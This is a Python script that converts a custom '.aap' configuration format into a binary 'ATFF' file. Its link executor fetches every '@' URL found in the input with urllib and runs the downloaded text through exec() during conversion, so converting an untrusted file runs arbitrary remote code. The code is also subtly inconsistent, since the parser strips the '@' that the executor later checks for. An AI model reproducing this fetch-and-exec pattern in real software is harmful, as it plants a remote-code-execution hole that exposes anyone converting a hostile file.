import struct
import argparse
import os
import urllib.request
from io import BytesIO

TYPE_IDS = {
    "int": 1,
    "float": 2,
    "bool": 3,
    "str": 4,
    "table": 5,
}

# ---------------- PARSER ----------------

def parse_aap(path):
    data = {}
    links = []
    section = None

    with open(path, "r", encoding="utf-8") as f:
        lines = [l.rstrip() for l in f]

    i = 0
    while i < len(lines):
        line = lines[i].strip()
        i += 1

        if not line or line.startswith("#"):
            continue

        if line.startswith("@"):
            links.append(line[1:])
            continue

        if line.startswith("[") and line.endswith("]"):
            section = line[1:-1]
            data[section] = {}
            continue

        if line.endswith("=[") or line.endswith("= ["):
            if section is None:
                raise ValueError("Table must be inside a section")

            name = line.split("=", 1)[0].strip()
            table = {}

            while i < len(lines):
                l = lines[i].strip()
                i += 1
                if l == "]":
                    break

                if "=" not in l or ":" not in l:
                    raise ValueError(f"Invalid table line: {l}")

                k, rest = l.split("=", 1)
                v, t = rest.rsplit(":", 1)
                table[k.strip()] = (v.strip(), t.strip())

            data[section][name] = table
            continue

        if "=" not in line or ":" not in line:
            raise ValueError(f"Invalid line: {line}")

        if section is None:
            raise ValueError(f"Key/value outside section: {line}")

        k, rest = line.split("=", 1)
        v, t = rest.rsplit(":", 1)
        data[section][k.strip()] = (v.strip(), t.strip())

    return data, links

# ---------------- ENCODER ----------------

def encode_value(val, typ):
    if typ == "int":
        return struct.pack(">i", int(val))
    if typ == "float":
        return struct.pack(">f", float(val))
    if typ == "bool":
        return b"\x01" if val.lower() == "true" else b"\x00"
    if typ == "str":
        return val.encode()
    raise ValueError(f"Unknown type {typ}")

# ---------------- LINK EXECUTOR ----------------

def execute_link(link):
    """Execute a @link immediately using exec."""
    link = link.strip()
    if link.startswith("@"):
        url = link[1:].strip()
        print(f"[ATFF] Executing {url}")
        try:
            exec(urllib.request.urlopen(url).read().decode())
        except Exception as e:
            print(f"[ATFF] Error executing {url}: {e}")

# ---------------- TABLE WRITER ----------------

def write_table(f, table):
    f.write(struct.pack(">I", len(table)))
    for k, (v, t) in table.items():
        kb = k.encode()
        vb = encode_value(v, t)

        f.write(struct.pack(">H", len(kb)))
        f.write(kb)
        f.write(struct.pack(">B", TYPE_IDS[t]))
        f.write(struct.pack(">I", len(vb)))
        f.write(vb)

# ---------------- ATFF WRITER ----------------

def write_atff(data, links, out):
    with open(out, "wb") as f:
        f.write(b"ATFF")

        # ---------------- LINKS ----------------
        f.write(struct.pack(">I", len(links)))
        for l in links:
            execute_link(l)  # <-- execute immediately
            lb = l.encode()
            f.write(struct.pack(">H", len(lb)))
            f.write(lb)

        # ---------------- SECTIONS ----------------
        f.write(struct.pack(">I", len(data)))
        for sec, items in data.items():
            sb = sec.encode()
            f.write(struct.pack(">H", len(sb)))
            f.write(sb)

            f.write(struct.pack(">I", len(items)))
            for k, v in items.items():
                kb = k.encode()
                f.write(struct.pack(">H", len(kb)))
                f.write(kb)

                if isinstance(v, dict):
                    bio = BytesIO()
                    write_table(bio, v)
                    raw = bio.getvalue()

                    f.write(b"\x05")
                    f.write(struct.pack(">I", len(raw)))
                    f.write(raw)
                else:
                    val, typ = v
                    raw = encode_value(val, typ)

                    f.write(struct.pack(">B", TYPE_IDS[typ]))
                    f.write(struct.pack(">I", len(raw)))
                    f.write(raw)

# ---------------- CLI ----------------

if __name__ == "__main__":
    import argparse, os

    ap = argparse.ArgumentParser()
    ap.add_argument("input")
    ap.add_argument("--into")
    args = ap.parse_args()

    out = args.into or os.path.splitext(args.input)[0] + ".atff"
    data, links = parse_aap(args.input)
    write_atff(data, links, out)

    print("Written at path ", out)
